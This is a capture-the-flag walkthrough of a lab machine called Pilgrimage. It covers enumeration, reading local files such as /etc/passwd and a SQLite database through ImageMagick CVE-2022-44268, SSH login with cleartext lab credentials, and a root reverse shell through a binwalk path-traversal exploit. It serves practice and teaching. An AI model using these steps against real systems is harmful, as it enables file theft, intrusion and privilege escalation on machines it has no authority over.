# Given Info

## IP

10.10.11.219

# Writeup

## Enumeration

Nmap

```sh
┌──(root㉿n0m4d)-[/host_data/pilgrimage/enum]
└─# nmap -A 10.10.11.219 -oN nmap.out
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 08:12 UTC
Nmap scan report for 10.10.11.219
Host is up (0.0077s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   11.55 ms 10.10.14.1
2   11.69 ms 10.10.11.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
```

Directory busting for files

![](Assets/Pasted%20image%2020250912162306.png)

Found a hidden git directory, and dumped it to get the source code in php for the pilgrimage site.

In `dashboard.php` there's a function to compress an uploaded image, and it uses a binary called magick.

![](Assets/Pasted%20image%2020250912163142.png)

Running the magick binary shows us the following:

![](Assets/Pasted%20image%2020250912193528.png)

And looking for the exploit's vulnerabilities gives us the following:

![](Assets/Pasted%20image%2020250912193655.png)

This particular exploit has too many steps, so I found one better using python: https://github.com/entr0pie/CVE-2022-44268

Following the steps there creates a file with some embedded code inside it as per the git repo's instructions. 

![](Assets/Pasted%20image%2020250912205332.png)

Upload this file to the website, and download the one that it minifies. 

The minified file is the one that has the response to the embedded code inside in RAW format

```sh
  Raw profile type:

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
```

Use python to decode the file, and display the contents.

```sh
┌──(root㉿n0m4d)-[/host_data/pilgrimage/vulns/CVE-2022-44268]
└─# ./bin/python -c "print(bytes.fromhex('<hash>'))"
```

![](Assets/Pasted%20image%2020250912211101.png)

Using the `xxd` tool can help to recreate the original file from the hex code

![](Assets/Pasted%20image%2020250912225000.png)

Next I can try to list the database referenced in the index.php file at

![](Assets/Pasted%20image%2020250912225806.png)

```sh
┌──(root㉿n0m4d)-[/host_data/pilgrimage/vulns/CVE-2022-44268]
└─# ./bin/python3 CVE-2022-44268.py /var/db/pilgrimage
```

Upload this to the site, download the shrunk file, and check it using xxd

![](Assets/Pasted%20image%2020250912230906.png)

Alternatively it could be written to file, and opened using SQLite

![](Assets/Pasted%20image%2020250912230958.png)

Then use SSH to login as Emily

Going through the privesc checklist, we get to the part about running processes. Looking for processes that run as root uses `ps aux | grep root`

There are a couple of interesting things to see here. 

![](Assets/Pasted%20image%2020250912232934.png)

Check to see if we can look at `malwarescan.sh`. How this file works is by running this malware scan everytime a file is dropped into `/var/www/pilgrimage.htb/shrunk`. This makes use of the binwalk binary which is the one I'm looking to exploit here.

```sh
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

Running the command gives us the version details

![](Assets/Pasted%20image%2020250912234216.png)

Running searchsploit for this version of binwalk gives us a python poc that we can use to create a new reverse shell as root. 

The attack itself is essentially a path traversal. It makes use of the effected version of binwalk using extract mode to open the malicious file. The bug itself is in a type of file system called PFS, where using `../` (not absolute paths), we can force binwalk to write files outside of its intended execution directory.

I started off by creating a `.png` file called `vuln.png` and ran the exploit as follows, giving my IP and listener port as additional arguments.

![](Assets/Pasted%20image%2020250913083730.png)

I also had a listener running as the malware scan will execute the moment a file is dropped into the `shrunk` directory on the target, and I needed to catch that reverse shell.

Next, I started a python web server, and transferred the `binwalk_exploit.png` file onto the target.

![](Assets/Pasted%20image%2020250913084006.png)

My listener caught the reverse shell, and I had root access.

# Creds

```sh
# SSH
emily : abigchonkyboi123
```

# Proof

![](Assets/Pasted%20image%2020250912231252.png)

![](Assets/Pasted%20image%2020250913084205.png)

# Resources

https://www.onekey.com/resource/security-advisory-remote-command-execution-in-binwalk

https://youtu.be/aaUlHicClrI?si=fIz_0LU3tOXRNN1x